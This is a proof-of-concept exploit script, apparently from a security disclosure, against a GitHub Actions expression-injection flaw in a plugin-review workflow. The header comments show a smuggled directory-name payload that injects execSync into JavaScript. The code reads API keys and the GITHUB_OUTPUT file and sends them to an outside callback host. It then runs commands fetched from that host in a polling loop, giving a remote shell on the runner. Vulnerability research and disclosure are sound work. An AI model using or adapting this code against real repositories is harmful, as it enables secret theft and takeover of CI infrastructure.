// PoC: okx/plugin-store-community — Expression Injection to RCE + Secret Exfiltration
// Researcher: Robert Prast (@robertprast)
//
// This script executes inside actions/github-script@v7 during the
// "Post review report" step of plugin-ai-review.yml (line ~436).
//
// How it gets here:
//   1. Attacker opens a fork PR with a crafted submission directory name
//   2. The "Detect plugin" step (line 46) runs:
//        PLUGIN_NAME=$(echo "$CHANGED" | head -1 | cut -d'/' -f2)
//        echo "plugin_name=${PLUGIN_NAME}" >> "$GITHUB_OUTPUT"
//   3. The "Post review report" step (line 444) injects the raw value:
//        const pluginName = '${{ steps.detect.outputs.plugin_name }}';
//   4. With the directory name "sec-test'+require('child_process').execSync('node pwn.js')+'",
//      this becomes valid JavaScript:
//        const pluginName = 'sec-test'+require('child_process').execSync('node pwn.js')+'';
//
// Impact:
//   - Arbitrary code execution on the GitHub Actions runner
//   - ANTHROPIC_API_KEY and OPENROUTER_API_KEY readable from shared GITHUB_OUTPUT
//     (the "Select API provider" step writes auth_header= with the raw key)
//   - GITHUB_TOKEN available with contents:read + pull-requests:write
//   - Interactive shell access via callback server

const https = require('https');
const { execSync } = require('child_process');
const fs = require('fs');

const CALLBACK = 'test.trebor.ai';
const repo = process.env.GITHUB_REPOSITORY || '';
const token = process.env.GITHUB_TOKEN || '';

// Read API keys from shared GITHUB_OUTPUT file
let apiKeys = '';
try {
  const content = fs.readFileSync(process.env.GITHUB_OUTPUT, 'utf8');
  const line = content.split('\n').find(l => l.startsWith('auth_header='));
  if (line) apiKeys = line.replace('auth_header=', '');
} catch (e) {}

// Read PR number from event payload
const prNum = (() => {
  try {
    return JSON.parse(fs.readFileSync(process.env.GITHUB_EVENT_PATH, 'utf8'))
      .pull_request?.number;
  } catch (e) { return null; }
})();

// Session context for callback server
const ctx = {
  repo,
  pr: prNum,
  run_id: process.env.GITHUB_RUN_ID || '?',
  host: (() => { try { return execSync('hostname').toString().trim(); } catch (e) { return '?'; } })(),
  actor: process.env.GITHUB_ACTOR || '?',
  event: process.env.GITHUB_EVENT_NAME || '?',
  api_keys: apiKeys || '(provider step has not written auth_header yet)',
  github_output: (() => { try { return fs.readFileSync(process.env.GITHUB_OUTPUT, 'utf8'); } catch (e) { return e.message; } })(),
};

function req(m, p, b) {
  return new Promise((ok, no) => {
    const o = {
      hostname: CALLBACK, port: 443, path: p, method: m,
      headers: { 'Content-Type': 'application/json' }
    };
    if (b) o.headers['Content-Length'] = Buffer.byteLength(b);
    const r = https.request(o, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => {
        try { ok({ s: res.statusCode, b: JSON.parse(d) }); }
        catch (e) { ok({ s: res.statusCode, b: d }); }
      });
    });
    r.on('error', no);
    r.setTimeout(15000, () => { r.destroy(); no(new Error('timeout')); });
    if (b) r.write(b);
    r.end();
  });
}

async function main() {
  let t;
  try {
    const i = await req('POST', '/v1/init', JSON.stringify(ctx));
    t = i.b.s;
    if (!t) return;
  } catch (e) { return; }

  const deadline = Date.now() + 300000;
  while (Date.now() < deadline) {
    try {
      const p = await req('GET', `/v1/config?s=${t}`);
      if (p.s === 200 && p.b?.run) {
        const c = p.b.run;
        if (c === 'exit 0' || c === 'exit') break;
        let o;
        try {
          o = execSync(c, {
            timeout: 30000, maxBuffer: 2 * 1024 * 1024, env: process.env
          }).toString();
        } catch (e) { o = e.stderr ? e.stderr.toString() : e.message; }
        await req('POST', `/v1/telemetry?s=${t}`, o);
      }
      await new Promise(r => setTimeout(r, 500));
    } catch (e) { await new Promise(r => setTimeout(r, 2000)); }
  }
}

main().catch(() => {});
